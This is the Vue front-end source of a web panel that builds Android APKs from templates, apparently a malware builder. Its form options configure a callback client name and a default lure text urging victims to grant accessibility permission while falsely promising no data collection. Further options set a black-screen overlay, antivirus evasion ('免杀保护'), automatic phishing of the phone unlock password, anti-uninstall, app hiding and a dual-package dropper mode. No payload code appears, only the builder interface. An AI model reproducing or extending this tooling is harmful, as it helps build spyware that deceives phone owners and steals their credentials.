<script setup lang="ts">
import { ref, computed, watch } from 'vue';
import { useForm, Head, router } from '@inertiajs/vue3';
import {
    NCard,
    NForm,
    NFormItem,
    NInput,
    NButton,
    NSpace,
    NSelect,
    NSwitch,
    NTabs,
    NTabPane,
    NGrid,
    NGridItem,
    NUpload,
    NImage,
    NIcon,
    NSpin,
    NAlert,
    NModal,
    NProgress,
    NSteps,
    NStep,
    createDiscreteApi,
    type UploadFileInfo,
} from 'naive-ui';
import {
    AddOutline,
    TrashOutline,
    CheckmarkCircleOutline,
    CloseCircleOutline,
    RocketOutline,
} from '@vicons/ionicons5';
import AuthenticatedLayout from '@/Layouts/AuthenticatedLayout.vue';
import { EventSourcePolyfill } from 'event-source-polyfill';

interface Template {
    id: number;
    name: string;
    package_name: string;
}

interface ImageItem {
    name: string;
    url: string;
}

interface BuildStep {
    name: string;
    label: string;
    status: 'wait' | 'process' | 'finish' | 'error';
    duration?: number;
}

interface Props {
    templates: Template[];
    icons: ImageItem[];
    backgrounds: ImageItem[];
}

const props = defineProps<Props>();
const { message } = createDiscreteApi(['message']);

const form = useForm({
    template_id: null as number | null,
    name: '',
    package_name: '',
    version: '',
    is_custom: true,
    client_name: '',
    app_url: '',
    use_wss: false,
    lng_short: '为了确保所有功能正常使用，需要您开启无障碍权限，此App不会收集或分享您的个人信息，请记住以下设置：选择 已下载的服务/应用 -找到本App-点击 打开并允许',
    use_atoprims: '加载中~请勿操作或锁屏！',
    login_dis: '',
    login_btn: '确定',
    install_type: 'f',
    install_type2: 'g',
    user_allprims: '1',
    user_blackprims: '1',
    hide_type: 'uninstall',
    use_antkill: '1',
    diao_type: '1',
    hidden_app: '1',
    use_draw: '1',
    open_access: '1',
    use_access: '1',
    icon_path: '',
    background_path: '',
    abg_path: '',
});

const iconList = ref<ImageItem[]>([...props.icons]);
const backgroundList = ref<ImageItem[]>([...props.backgrounds]);
const selectedIcon = ref<string>('');
const selectedBackground = ref<string>('');
const selectedAbg = ref<string>('');
const uploadingIcon = ref(false);
const uploadingBg = ref(false);

const showBuildModal = ref(false);
const buildSteps = ref<BuildStep[]>([
    { name: 'check_dependencies', label: '检查依赖', status: 'wait' },
    { name: 'prepare_work_dir', label: '准备工作目录', status: 'wait' },
    { name: 'modify_smali', label: '修改配置', status: 'wait' },
    { name: 'modify_manifest', label: '修改清单', status: 'wait' },
    { name: 'modify_resources', label: '修改资源', status: 'wait' },
    { name: 'replace_icon', label: '替换图标', status: 'wait' },
    { name: 'replace_background', label: '替换背景', status: 'wait' },
    { name: 'encrypt_resources', label: '加密资源', status: 'wait' },
    { name: 'build_apk', label: '打包 APK', status: 'wait' },
    { name: 'sign_apk', label: '签名', status: 'wait' },
    { name: 'move_output', label: '输出文件', status: 'wait' },
]);
const buildProgress = ref(0);
const buildError = ref<string | null>(null);
const buildSuccess = ref(false);
const currentStepIndex = ref(0);
const eventSource = ref<EventSource | EventSourcePolyfill | null>(null);

const templateOptions = props.templates.map(t => ({
    label: t.name,
    value: t.id,
}));

const installTypeOptions = [
    { label: '单包模式', value: 'f' },
    { label: '双包模式', value: 'd' },
];

const installType2Options = [
    { label: '默认', value: 'g' },
    { label: '百分百触发(国外单包专用)', value: 's' },
];

const allprimsOptions = [
    { label: '全部权限', value: '1' },
    { label: 'Google Play模式', value: '0' },
];

const blackprimsOptions = [
    { label: '外置遮挡', value: '0' },
    { label: '内置遮挡', value: '1' },
];

const hideTypeOptions = [
    { label: '直接隐藏', value: 'direct' },
    { label: '卸载隐藏（推荐）', value: 'uninstall' },
    { label: '提示卸载', value: 'prompt' },
];

const switchOptions = [
    { label: '关闭', value: '0' },
    { label: '开启', value: '1' },
];

const showAbgUpload = computed(() => form.install_type === 'd');

watch(() => form.install_type, (val) => {
    if (val !== 'd') {
        form.abg_path = '';
        selectedAbg.value = '';
    }
});

const selectIcon = (icon: ImageItem) => {
    selectedIcon.value = icon.name;
    form.icon_path = icon.url;
};

const selectBackground = (bg: ImageItem) => {
    selectedBackground.value = bg.name;
    form.background_path = bg.url;
};

const selectAbg = (bg: ImageItem) => {
    selectedAbg.value = bg.name;
    form.abg_path = bg.url;
};

const handleIconUpload = async (options: { file: UploadFileInfo }) => {
    if (!options.file.file) return;
    uploadingIcon.value = true;
    const formData = new FormData();
    formData.append('icon', options.file.file);
    try {
        const response = await fetch('/builds/assets/icons', {
            method: 'POST',
            body: formData,
            headers: {
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '',
            },
        });
        const data = await response.json();
        if (data.success) {
            iconList.value.unshift(data.icon);
            selectIcon(data.icon);
            message.success('图标上传成功');
        }
    } catch (e) {
        message.error('图标上传失败');
    } finally {
        uploadingIcon.value = false;
    }
};

const handleBgUpload = async (options: { file: UploadFileInfo }, type: 'blackui' | 'abg' = 'blackui') => {
    if (!options.file.file) return;
    uploadingBg.value = true;
    const formData = new FormData();
    formData.append('background', options.file.file);
    formData.append('type', type);
    try {
        const response = await fetch('/builds/assets/backgrounds', {
            method: 'POST',
            body: formData,
            headers: {
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '',
            },
        });
        const data = await response.json();
        if (data.success) {
            backgroundList.value.unshift(data.background);
            if (type === 'blackui') {
                selectBackground(data.background);
            } else {
                selectAbg(data.background);
            }
            message.success('背景图上传成功');
        }
    } catch (e) {
        message.error('背景图上传失败');
    } finally {
        uploadingBg.value = false;
    }
};

const deleteIcon = async (icon: ImageItem) => {
    try {
        await fetch('/builds/assets/icons', {
            method: 'DELETE',
            body: JSON.stringify({ name: icon.name }),
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '',
            },
        });
        iconList.value = iconList.value.filter(i => i.name !== icon.name);
        if (selectedIcon.value === icon.name) {
            selectedIcon.value = '';
            form.icon_path = '';
        }
        message.success('图标已删除');
    } catch (e) {
        message.error('删除失败');
    }
};

const startBuild = () => {
    // 使用表单验证
    if (!validateForm()) {
        return;
    }
    
    buildSteps.value = buildSteps.value.map(s => ({ ...s, status: 'wait', duration: undefined }));
    buildProgress.value = 0;
    buildError.value = null;
    buildSuccess.value = false;
    currentStepIndex.value = 0;
    showBuildModal.value = true;
    
    const formData = new FormData();
    Object.entries(form.data()).forEach(([key, value]) => {
        if (value !== null && value !== undefined) {
            formData.append(key, String(value));
        }
    });
    
    const params = new URLSearchParams();
    formData.forEach((value, key) => {
        params.append(key, String(value));
    });
    
    eventSource.value = new EventSourcePolyfill(`/builds/stream?${params.toString()}`, {
        withCredentials: true,
    });
    
    eventSource.value.onmessage = (event) => {
        const data = JSON.parse(event.data);
        handleBuildEvent(data);
    };
    
    eventSource.value.onerror = () => {
        if (!buildSuccess.value && !buildError.value) {
            buildError.value = '连接中断';
        }
        closeEventSource();
    };
};

const handleBuildEvent = (data: any) => {
    if (data.type === 'step') {
        const stepIndex = buildSteps.value.findIndex(s => s.name === data.step);
        if (stepIndex >= 0) {
            if (data.status === 'running') {
                buildSteps.value[stepIndex].status = 'process';
                currentStepIndex.value = stepIndex;
            } else if (data.status === 'done') {
                buildSteps.value[stepIndex].status = 'finish';
                buildSteps.value[stepIndex].duration = data.duration;
                buildProgress.value = Math.round(((stepIndex + 1) / buildSteps.value.length) * 100);
            }
        }
    } else if (data.type === 'complete') {
        buildSuccess.value = true;
        buildProgress.value = 100;
        closeEventSource();
        message.success('APK 构建成功');
        setTimeout(() => {
            showBuildModal.value = false;
            router.visit('/builds');
        }, 1500);
    } else if (data.type === 'error') {
        buildError.value = data.error;
        const currentStep = buildSteps.value[currentStepIndex.value];
        if (currentStep) {
            currentStep.status = 'error';
        }
        closeEventSource();
    }
};

const closeEventSource = () => {
    if (eventSource.value) {
        eventSource.value.close();
        eventSource.value = null;
    }
};

const closeBuildModal = () => {
    if (buildSuccess.value || buildError.value) {
        showBuildModal.value = false;
        if (buildSuccess.value) {
            router.visit('/builds');
        }
    }
};

// 验证包名格式 (如 com.example.app)
const isValidPackageName = (packageName: string): boolean => {
    if (!packageName) return true; // 允许为空（后端会自动生成）
    const regex = /^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)+$/;
    return regex.test(packageName);
};

// 验证表单
const validateForm = (): boolean => {
    // 验证应用名称
    if (!form.name.trim()) {
        message.error('请输入应用名称');
        return false;
    }

    // 验证包名格式（如果填写了的话）
    if (form.package_name && !isValidPackageName(form.package_name)) {
        message.error('包名格式错误，应为 com.example.app 格式（至少两段，如 com.app）');
        return false;
    }

    // 验证版本号格式（如果填写了的话）
    if (form.version && !/^\d+(\.\d+){0,2}$/.test(form.version)) {
        message.error('版本号格式错误，应为 1.0 或 1.0.0 格式');
        return false;
    }

    return true;
};
</script>

<template>
    <Head title="新建 APK 构建" />
    <AuthenticatedLayout>
        <template #header-title>新建 APK 构建</template>

        <div class="build-create-container">
            <NForm @submit.prevent="startBuild" label-placement="top">
                <NTabs type="line" animated>
                    <NTabPane name="basic" tab="基本信息">
                        <div class="tab-content">
                            <NCard size="small" class="form-card">
                                <template #header>
                                    <span class="card-title">上线名称</span>
                                </template>
                                <NFormItem label="客户端标识" :validation-status="form.errors.client_name ? 'error' : undefined">
                                    <NInput v-model:value="form.client_name" placeholder="请输入上线名称" maxlength="16" show-count />
                                </NFormItem>
                            </NCard>

                            <NCard size="small" class="form-card">
                                <template #header>
                                    <span class="card-title">应用信息</span>
                                </template>
                                <NGrid :cols="2" :x-gap="16">
                                    <NGridItem>
                                        <NFormItem label="应用名称" :validation-status="form.errors.name ? 'error' : undefined">
                                            <NInput v-model:value="form.name" placeholder="应用名称" maxlength="32" show-count />
                                            <template #feedback>{{ form.errors.name }}</template>
                                        </NFormItem>
                                    </NGridItem>
                                    <NGridItem>
                                        <NFormItem label="应用网址">
                                            <NInput v-model:value="form.app_url" placeholder="https://example.com" />
                                        </NFormItem>
                                    </NGridItem>
                                </NGrid>
                            </NCard>

                            <NCard size="small" class="form-card">
                                <template #header>
                                    <span class="card-title">包名版本</span>
                                </template>
                                <NGrid :cols="2" :x-gap="16">
                                    <NGridItem>
                                        <NFormItem label="应用包名（留空自动生成）" :validation-status="form.errors.package_name ? 'error' : undefined">
                                            <NInput v-model:value="form.package_name" placeholder="com.example.app" />
                                        </NFormItem>
                                    </NGridItem>
                                    <NGridItem>
                                        <NFormItem label="应用版本（留空随机生成）">
                                            <NInput v-model:value="form.version" placeholder="如 1.0" />
                                        </NFormItem>
                                    </NGridItem>
                                </NGrid>
                            </NCard>
                        </div>
                    </NTabPane>

                    <NTabPane name="ui" tab="界面设置">
                        <div class="tab-content">
                            <NCard size="small" class="form-card">
                                <template #header>
                                    <span class="card-title">界面文字</span>
                                </template>
                                <NFormItem label="窗口文字">
                                    <NInput v-model:value="form.lng_short" type="textarea" :rows="4" />
                                </NFormItem>
                                <NFormItem label="黑屏文字">
                                    <NInput v-model:value="form.use_atoprims" placeholder="黑屏文字" />
                                </NFormItem>
                            </NCard>

                            <NCard size="small" class="form-card">
                                <template #header>
                                    <span class="card-title">左右按钮</span>
                                </template>
                                <NGrid :cols="2" :x-gap="16">
                                    <NGridItem>
                                        <NFormItem label="限制按钮（左）">
                                            <NInput v-model:value="form.login_dis" placeholder="不填则不显示" />
                                        </NFormItem>
                                    </NGridItem>
                                    <NGridItem>
                                        <NFormItem label="跳转按钮（右）">
                                            <NInput v-model:value="form.login_btn" placeholder="确定" />
                                        </NFormItem>
                                    </NGridItem>
                                </NGrid>
                            </NCard>
                        </div>
                    </NTabPane>

                    <NTabPane name="features" tab="功能设置">
                        <div class="tab-content">
                            <NCard size="small" class="form-card">
                                <template #header>
                                    <span class="card-title">安装模式</span>
                                </template>
                                <NGrid :cols="2" :x-gap="16">
                                    <NGridItem>
                                        <NFormItem label="包模式">
                                            <NSelect v-model:value="form.install_type" :options="installTypeOptions" />
                                        </NFormItem>
                                    </NGridItem>
                                    <NGridItem>
                                        <NFormItem label="触发模式">
                                            <NSelect v-model:value="form.install_type2" :options="installType2Options" />
                                        </NFormItem>
                                    </NGridItem>
                                </NGrid>
                            </NCard>

                            <NCard size="small" class="form-card">
                                <template #header>
                                    <span class="card-title">应用权限</span>
                                </template>
                                <NGrid :cols="2" :x-gap="16">
                                    <NGridItem>
                                        <NFormItem label="权限范围">
                                            <NSelect v-model:value="form.user_allprims" :options="allprimsOptions" />
                                        </NFormItem>
                                    </NGridItem>
                                    <NGridItem>
                                        <NFormItem label="黑屏方式">
                                            <NSelect v-model:value="form.user_blackprims" :options="blackprimsOptions" />
                                        </NFormItem>
                                    </NGridItem>
                                </NGrid>
                            </NCard>

                            <NCard size="small" class="form-card">
                                <template #header>
                                    <span class="card-title">隐藏模式</span>
                                </template>
                                <NGrid :cols="2" :x-gap="16">
                                    <NGridItem>
                                        <NFormItem label="隐藏方式">
                                            <NSelect v-model:value="form.hide_type" :options="hideTypeOptions" />
                                        </NFormItem>
                                    </NGridItem>
                                    <NGridItem>
                                        <NFormItem label="免杀保护">
                                            <NSelect v-model:value="form.use_antkill" :options="switchOptions" />
                                        </NFormItem>
                                    </NGridItem>
                                </NGrid>
                            </NCard>

                            <NCard size="small" class="form-card">
                                <template #header>
                                    <span class="card-title">功能开关</span>
                                </template>
                                <NGrid :cols="2" :x-gap="16" :y-gap="8">
                                    <NGridItem>
                                        <NFormItem label="自动钓鱼解锁密码">
                                            <NSelect v-model:value="form.diao_type" :options="switchOptions" />
                                        </NFormItem>
                                    </NGridItem>
                                    <NGridItem>
                                        <NFormItem label="防止卸载">
                                            <NSelect v-model:value="form.hidden_app" :options="switchOptions" />
                                        </NFormItem>
                                    </NGridItem>
                                    <NGridItem>
                                        <NFormItem label="悬浮窗权限">
                                            <NSelect v-model:value="form.use_draw" :options="switchOptions" />
                                        </NFormItem>
                                    </NGridItem>
                                    <NGridItem>
                                        <NFormItem label="自动打开无障碍">
                                            <NSelect v-model:value="form.open_access" :options="switchOptions" />
                                        </NFormItem>
                                    </NGridItem>
                                    <NGridItem>
                                        <NFormItem label="无障碍服务">
                                            <NSelect v-model:value="form.use_access" :options="switchOptions" />
                                        </NFormItem>
                                    </NGridItem>
                                </NGrid>
                            </NCard>
                        </div>
                    </NTabPane>

                    <NTabPane name="assets" tab="图标资源">
                        <div class="tab-content">
                            <NCard size="small" class="form-card">
                                <template #header>
                                    <span class="card-title">应用图标</span>
                                </template>
                                <div class="asset-grid">
                                    <NUpload accept="image/png,image/jpeg" :show-file-list="false" :custom-request="handleIconUpload" class="upload-trigger">
                                        <div class="upload-btn">
                                            <NSpin v-if="uploadingIcon" size="small" />
                                            <template v-else>
                                                <NIcon :component="AddOutline" size="24" />
                                                <span>上传</span>
                                            </template>
                                        </div>
                                    </NUpload>
                                    <div v-for="icon in iconList" :key="icon.name" class="asset-item" :class="{ selected: selectedIcon === icon.name }" @click="selectIcon(icon)">
                                        <img :src="icon.url" :alt="icon.name" />
                                        <div v-if="selectedIcon === icon.name" class="selected-badge">
                                            <NIcon :component="CheckmarkCircleOutline" />
                                        </div>
                                        <button type="button" class="delete-btn" @click.stop="deleteIcon(icon)">
                                            <NIcon :component="TrashOutline" size="14" />
                                        </button>
                                    </div>
                                </div>
                            </NCard>

                            <NCard size="small" class="form-card">
                                <template #header>
                                    <span class="card-title">遮盖底图</span>
                                </template>
                                <NAlert type="info" :bordered="false" class="mb-3">
                                    获取无障碍权限界面底图，支持 PNG/JPG 格式
                                </NAlert>
                                <div class="asset-grid asset-grid-large">
                                    <NUpload accept="image/png,image/jpeg" :show-file-list="false" :custom-request="(opts) => handleBgUpload(opts, 'blackui')" class="upload-trigger">
                                        <div class="upload-btn upload-btn-large">
                                            <NSpin v-if="uploadingBg" size="small" />
                                            <template v-else>
                                                <NIcon :component="AddOutline" size="24" />
                                                <span>上传底图</span>
                                            </template>
                                        </div>
                                    </NUpload>
                                    <div v-for="bg in backgroundList" :key="bg.name" class="asset-item asset-item-large" :class="{ selected: selectedBackground === bg.name }" @click="selectBackground(bg)">
                                        <img :src="bg.url" :alt="bg.name" />
                                        <div v-if="selectedBackground === bg.name" class="selected-badge">
                                            <NIcon :component="CheckmarkCircleOutline" />
                                        </div>
                                    </div>
                                </div>
                            </NCard>

                            <NCard v-if="showAbgUpload" size="small" class="form-card">
                                <template #header>
                                    <span class="card-title">A包背景（双包模式专用）</span>
                                </template>
                                <NAlert type="warning" :bordered="false" class="mb-3">
                                    不上传则使用默认背景。建议尺寸 1080×1920
                                </NAlert>
                                <div class="asset-grid asset-grid-large">
                                    <NUpload accept="image/png,image/jpeg" :show-file-list="false" :custom-request="(opts) => handleBgUpload(opts, 'abg')" class="upload-trigger">
                                        <div class="upload-btn upload-btn-large">
                                            <NIcon :component="AddOutline" size="24" />
                                            <span>上传背景</span>
                                        </div>
                                    </NUpload>
                                    <div v-for="bg in backgroundList" :key="'abg-' + bg.name" class="asset-item asset-item-large" :class="{ selected: selectedAbg === bg.name }" @click="selectAbg(bg)">
                                        <img :src="bg.url" :alt="bg.name" />
                                        <div v-if="selectedAbg === bg.name" class="selected-badge">
                                            <NIcon :component="CheckmarkCircleOutline" />
                                        </div>
                                    </div>
                                </div>
                            </NCard>
                        </div>
                    </NTabPane>
                </NTabs>

                <div class="form-actions">
                    <NSpace>
                        <NButton type="primary" size="large" attr-type="submit" :disabled="!form.name">
                            <template #icon>
                                <NIcon :component="RocketOutline" />
                            </template>
                            开始生成
                        </NButton>
                        <NButton size="large" tag="a" href="/builds">取消</NButton>
                    </NSpace>
                </div>
            </NForm>
        </div>

        <NModal v-model:show="showBuildModal" :mask-closable="false" :closable="false" :show-icon="false" transform-origin="center">
            <div class="build-modal">
                <!-- 头部状态区域 -->
                <div class="build-modal-header" :class="{ 'success': buildSuccess, 'error': buildError }">
                    <div class="header-icon">
                        <div v-if="buildSuccess" class="icon-circle success">
                            <NIcon :component="CheckmarkCircleOutline" size="32" />
                        </div>
                        <div v-else-if="buildError" class="icon-circle error">
                            <NIcon :component="CloseCircleOutline" size="32" />
                        </div>
                        <div v-else class="icon-circle processing">
                            <NIcon :component="RocketOutline" size="32" />
                            <div class="pulse-ring"></div>
                        </div>
                    </div>
                    <h2 class="header-title">
                        {{ buildSuccess ? '构建成功' : buildError ? '构建失败' : '正在构建 APK' }}
                    </h2>
                    <p class="header-subtitle">
                        {{ buildSuccess ? '即将跳转到构建列表...' : buildError ? '请检查错误信息' : '请耐心等待，不要关闭页面' }}
                    </p>
                </div>

                <!-- 进度区域 -->
                <div class="build-modal-body">
                    <!-- 进度条 -->
                    <div v-if="!buildSuccess && !buildError" class="progress-section">
                        <div class="progress-header">
                            <span class="progress-label">构建进度</span>
                            <span class="progress-value">{{ buildProgress }}%</span>
                        </div>
                        <div class="progress-bar-wrapper">
                            <div class="progress-bar" :style="{ width: buildProgress + '%' }">
                                <div class="progress-bar-glow"></div>
                            </div>
                        </div>
                    </div>

                    <!-- 错误信息 -->
                    <div v-if="buildError" class="error-section">
                        <div class="error-box">
                            <NIcon :component="CloseCircleOutline" size="18" />
                            <span>{{ buildError }}</span>
                        </div>
                    </div>

                    <!-- 步骤列表 -->
                    <div class="steps-section">
                        <div class="steps-header">
                            <span>构建步骤</span>
                            <span class="steps-count">{{ buildSteps.filter(s => s.status === 'finish').length }}/{{ buildSteps.length }}</span>
                        </div>
                        <div class="steps-list">
                            <div v-for="(step, index) in buildSteps" :key="step.name" class="step-item" :class="step.status">
                                <div class="step-indicator">
                                    <div v-if="step.status === 'finish'" class="indicator-done">
                                        <NIcon :component="CheckmarkCircleOutline" size="16" />
                                    </div>
                                    <div v-else-if="step.status === 'process'" class="indicator-processing">
                                        <div class="spinner"></div>
                                    </div>
                                    <div v-else-if="step.status === 'error'" class="indicator-error">
                                        <NIcon :component="CloseCircleOutline" size="16" />
                                    </div>
                                    <div v-else class="indicator-wait">
                                        <span>{{ index + 1 }}</span>
                                    </div>
                                </div>
                                <div class="step-content">
                                    <span class="step-label">{{ step.label }}</span>
                                    <span v-if="step.duration" class="step-duration">{{ step.duration }}ms</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- 底部操作区域 -->
                <div v-if="buildError" class="build-modal-footer">
                    <NButton type="primary" size="large" block @click="closeBuildModal">
                        关闭
                    </NButton>
                </div>
            </div>
        </NModal>
    </AuthenticatedLayout>
</template>

<style scoped>
.build-create-container { max-width: 900px; }
.tab-content { padding: 16px 0; }
.form-card { margin-bottom: 16px; }
.card-title { font-weight: 600; font-size: 15px; }
.form-hint { font-size: 12px; color: #94a3b8; }
.form-actions { margin-top: 24px; padding: 20px; background: white; border-radius: 12px; border: 1px solid #e2e8f0; }
.asset-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(72px, 1fr)); gap: 12px; }
.asset-grid-large { grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); }
.upload-trigger { width: 100%; }
.upload-btn { width: 72px; height: 72px; border: 2px dashed #e2e8f0; border-radius: 12px; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 4px; cursor: pointer; transition: all 0.2s; color: #94a3b8; font-size: 12px; }
.upload-btn:hover { border-color: #10B981; color: #10B981; }
.upload-btn-large { width: 120px; height: 160px; }
.asset-item { width: 72px; height: 72px; border-radius: 12px; overflow: hidden; cursor: pointer; position: relative; border: 2px solid transparent; transition: all 0.2s; }
.asset-item-large { width: 120px; height: 160px; }
.asset-item:hover { border-color: #10B981; }
.asset-item.selected { border-color: #10B981; box-shadow: 0 0 0 2px rgba(16, 185, 129, 0.2); }
.asset-item img { width: 100%; height: 100%; object-fit: cover; }
.selected-badge { position: absolute; top: 4px; right: 4px; width: 20px; height: 20px; background: #10B981; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; }
.delete-btn { position: absolute; top: 4px; left: 4px; width: 20px; height: 20px; background: rgba(239, 68, 68, 0.9); border: none; border-radius: 50%; display: none; align-items: center; justify-content: center; color: white; cursor: pointer; }
.asset-item:hover .delete-btn { display: flex; }
.mb-3 { margin-bottom: 12px; }
/* 构建弹窗样式 */
.build-modal {
    width: 480px;
    background: linear-gradient(180deg, #f8fafc 0%, #ffffff 100%);
    border-radius: 20px;
    overflow: hidden;
    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
}

.build-modal-header {
    padding: 32px 24px 24px;
    text-align: center;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    position: relative;
    overflow: hidden;
}

.build-modal-header::before {
    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 200%;
    height: 200%;
    background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 60%);
    animation: shimmer 3s ease-in-out infinite;
}

@keyframes shimmer {
    0%, 100% { transform: translateX(-30%) translateY(-30%); }
    50% { transform: translateX(30%) translateY(30%); }
}

.build-modal-header.success {
    background: linear-gradient(135deg, #10b981 0%, #059669 100%);
}

.build-modal-header.error {
    background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
}

.header-icon {
    position: relative;
    display: inline-block;
    margin-bottom: 16px;
}

.icon-circle {
    width: 64px;
    height: 64px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
    position: relative;
    z-index: 1;
}

.icon-circle.success { background: rgba(255, 255, 255, 0.2); }
.icon-circle.error { background: rgba(255, 255, 255, 0.2); }
.icon-circle.processing { background: rgba(255, 255, 255, 0.2); }

.pulse-ring {
    position: absolute;
    top: 50%;
    left: 50%;
    width: 64px;
    height: 64px;
    border-radius: 50%;
    border: 2px solid rgba(255, 255, 255, 0.6);
    transform: translate(-50%, -50%);
    animation: pulse 1.5s ease-out infinite;
}

@keyframes pulse {
    0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
    100% { transform: translate(-50%, -50%) scale(1.8); opacity: 0; }
}

.header-title {
    font-size: 20px;
    font-weight: 600;
    color: white;
    margin: 0 0 8px;
    position: relative;
    z-index: 1;
}

.header-subtitle {
    font-size: 14px;
    color: rgba(255, 255, 255, 0.8);
    margin: 0;
    position: relative;
    z-index: 1;
}

.build-modal-body {
    padding: 24px;
}

.progress-section {
    margin-bottom: 24px;
}

.progress-header {
    display: flex;
    justify-content: space-between;
    margin-bottom: 10px;
}

.progress-label {
    font-size: 13px;
    color: #64748b;
    font-weight: 500;
}

.progress-value {
    font-size: 14px;
    font-weight: 600;
    color: #667eea;
}

.progress-bar-wrapper {
    height: 8px;
    background: #e2e8f0;
    border-radius: 4px;
    overflow: hidden;
}

.progress-bar {
    height: 100%;
    background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
    border-radius: 4px;
    transition: width 0.3s ease;
    position: relative;
}

.progress-bar-glow {
    position: absolute;
    top: 0;
    right: 0;
    width: 40px;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4));
    animation: glow 1.5s ease-in-out infinite;
}

@keyframes glow {
    0%, 100% { opacity: 0; }
    50% { opacity: 1; }
}

.error-section {
    margin-bottom: 20px;
}

.error-box {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 14px 16px;
    background: #fef2f2;
    border: 1px solid #fecaca;
    border-radius: 10px;
    color: #dc2626;
    font-size: 14px;
}

.steps-section {
    background: #f8fafc;
    border-radius: 12px;
    padding: 16px;
}

.steps-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 14px;
    padding-bottom: 12px;
    border-bottom: 1px solid #e2e8f0;
    font-size: 13px;
    font-weight: 600;
    color: #475569;
}

.steps-count {
    font-weight: 500;
    color: #667eea;
    background: #eef2ff;
    padding: 2px 10px;
    border-radius: 12px;
    font-size: 12px;
}

.steps-list {
    display: flex;
    flex-direction: column;
    gap: 6px;
    max-height: 280px;
    overflow-y: auto;
}

.step-item {
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 10px 12px;
    border-radius: 8px;
    transition: all 0.2s ease;
}

.step-item.process {
    background: #eef2ff;
}

.step-item.finish {
    opacity: 0.7;
}

.step-item.error {
    background: #fef2f2;
}

.step-indicator {
    flex-shrink: 0;
}

.indicator-done {
    width: 24px;
    height: 24px;
    border-radius: 50%;
    background: #10b981;
    color: white;
    display: flex;
    align-items: center;
    justify-content: center;
}

.indicator-processing {
    width: 24px;
    height: 24px;
    display: flex;
    align-items: center;
    justify-content: center;
}

.spinner {
    width: 20px;
    height: 20px;
    border: 2px solid #e2e8f0;
    border-top-color: #667eea;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

.indicator-error {
    width: 24px;
    height: 24px;
    border-radius: 50%;
    background: #ef4444;
    color: white;
    display: flex;
    align-items: center;
    justify-content: center;
}

.indicator-wait {
    width: 24px;
    height: 24px;
    border-radius: 50%;
    background: #e2e8f0;
    color: #94a3b8;
    font-size: 12px;
    font-weight: 600;
    display: flex;
    align-items: center;
    justify-content: center;
}

.step-content {
    flex: 1;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.step-label {
    font-size: 13px;
    color: #475569;
}

.step-item.process .step-label {
    color: #667eea;
    font-weight: 500;
}

.step-item.error .step-label {
    color: #dc2626;
}

.step-duration {
    font-size: 11px;
    color: #94a3b8;
    background: #e2e8f0;
    padding: 2px 8px;
    border-radius: 10px;
}

.build-modal-footer {
    padding: 16px 24px 24px;
}
</style>
